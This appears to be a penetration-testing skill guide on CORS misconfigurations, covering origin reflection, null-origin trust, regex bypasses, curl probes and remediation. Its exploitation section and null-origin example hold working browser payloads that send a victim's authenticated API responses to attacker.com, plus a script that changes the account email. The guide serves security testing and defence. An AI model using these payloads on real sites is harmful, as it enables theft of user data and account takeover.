---
name: cors-misconfiguration
description: CORS misconfiguration testing covering origin reflection, null origin trust, wildcard with credentials, and subdomain abuse
---

# CORS Misconfiguration

Cross-Origin Resource Sharing misconfigurations allow attackers to read sensitive responses from a victim's authenticated session. The browser enforces CORS, but the server controls the policy. When the policy is permissive, any website can exfiltrate data, trigger state-changing actions, or access internal APIs through a victim's browser.

## Attack Surface

**Types**
- Reflected Origin in `Access-Control-Allow-Origin` (ACAO)
- `null` origin trusted with credentials
- Wildcard (`*`) combined with `Access-Control-Allow-Credentials: true`
- Subdomain-based trust (including vulnerable subdomains)
- Pre-flight bypass via simple requests
- Internal network access through browser-based CORS exploitation

**Contexts**
- REST APIs, GraphQL endpoints, single-page applications, microservice gateways, CDN/proxy configurations

**Frameworks**
- Express cors middleware, Spring CORS config, Django django-cors-headers, Flask-CORS, Nginx/Apache headers, API gateways (Kong, AWS API Gateway)

**Defenses to Bypass**
- Origin allowlists with regex flaws, partial string matching, pre-flight caching

## Key Vulnerabilities

### Reflected Origin

Server copies the `Origin` request header directly into `Access-Control-Allow-Origin`:
```
Request:  Origin: https://evil.com
Response: Access-Control-Allow-Origin: https://evil.com
          Access-Control-Allow-Credentials: true
```
Any origin can read authenticated responses.

### Null Origin Trust

Server trusts `Origin: null`, which can be triggered from sandboxed iframes, data URIs, and redirects:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
fetch('https://target.com/api/user', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/log?data=' + JSON.stringify(d)));
</script>
"></iframe>
```

### Wildcard with Credentials

While browsers block `*` with credentials, some servers or proxies misconfigure this, or use `*` without credentials but expose sensitive data in responses that don't require cookies (token-based APIs).

### Subdomain Trust

Server allows `*.target.com` — if any subdomain is compromised (XSS, subdomain takeover), it becomes a CORS pivot:
```
Origin: https://xss-vulnerable.target.com
```
The compromised subdomain reads from the main application's APIs.

### Regex Bypass in Origin Validation

Flawed regex patterns for allowlisting:
- `target.com` matches `attackertarget.com` (missing anchor)
- `https://target\.com` matches `https://target.com.evil.com` (missing end anchor)
- `https?://(.*\.)?target\.com` matches `https://evil.target.com` but also potentially `https://target.com.evil.com` depending on implementation

**Common bypasses:**
```
https://target.com.evil.com
https://evil-target.com
https://targetxcom.evil.com  (dot treated as wildcard in regex)
https://target.com%60.evil.com  (encoding tricks)
```

### Pre-flight Bypass

Simple requests (GET/POST with standard content types) skip pre-flight OPTIONS checks. If the server only validates CORS on pre-flight but serves data on simple requests, the policy is bypassed.

## Testing Methodology

1. **Identify CORS headers** — send requests with `Origin: https://evil.com` and inspect `Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials`
2. **Test origin reflection** — check if arbitrary origins are reflected back
3. **Test null origin** — send `Origin: null` and check if it's trusted
4. **Test subdomain variations** — try `Origin: https://anything.target.com`
5. **Test regex bypasses** — try prefix/suffix attacks on the domain
6. **Check pre-flight** — send OPTIONS with `Access-Control-Request-Method` and non-simple headers; compare to direct request behavior
7. **Check credentials** — verify if `Access-Control-Allow-Credentials: true` is set alongside permissive origins
8. **Internal network** — from a CORS-exploitable external endpoint, attempt to pivot to internal services

**curl Commands:**
```bash
# Test origin reflection
curl -s -I -H "Origin: https://evil.com" https://target.com/api/me | grep -i access-control

# Test null origin
curl -s -I -H "Origin: null" https://target.com/api/me | grep -i access-control

# Test subdomain trust
curl -s -I -H "Origin: https://test.target.com" https://target.com/api/me | grep -i access-control

# Test regex bypass
curl -s -I -H "Origin: https://target.com.evil.com" https://target.com/api/me | grep -i access-control

# Test pre-flight
curl -s -I -X OPTIONS -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: Authorization" \
  https://target.com/api/me | grep -i access-control
```

## Exploitation

**Data Exfiltration PoC:**
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/api/sensitive-data', true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4) {
    fetch('https://attacker.com/collect', {
      method: 'POST',
      body: xhr.responseText
    });
  }
};
xhr.send();
</script>
```

**State-Changing Action:**
```html
<script>
fetch('https://target.com/api/change-email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'email=attacker@evil.com'
});
</script>
```

## Indicators of Vulnerability

- `Access-Control-Allow-Origin` reflects the request `Origin` header verbatim
- `Access-Control-Allow-Origin: null` with `Access-Control-Allow-Credentials: true`
- Origin validation uses substring matching or unanchored regex
- Sensitive endpoints return data with permissive CORS and credentials enabled
- Pre-flight response allows methods/headers that the application does not need

## Remediation

- Use a strict allowlist of trusted origins; never reflect the Origin header directly
- Never trust `null` origin
- Avoid wildcard `*` on endpoints that return user-specific data
- Anchor regex patterns: `^https://app\.example\.com$`
- Validate CORS on every response, not just pre-flight
- Set `Vary: Origin` to prevent cache poisoning
- Minimize `Access-Control-Allow-Methods` and `Access-Control-Allow-Headers` to what is required
- Use `SameSite` cookie attributes as defense-in-depth

## Summary

CORS misconfigurations turn the browser into an attacker proxy, reading authenticated data cross-origin. Test every API endpoint for origin reflection, null trust, regex flaws, and subdomain pivots. The fix is a strict, explicitly maintained origin allowlist.
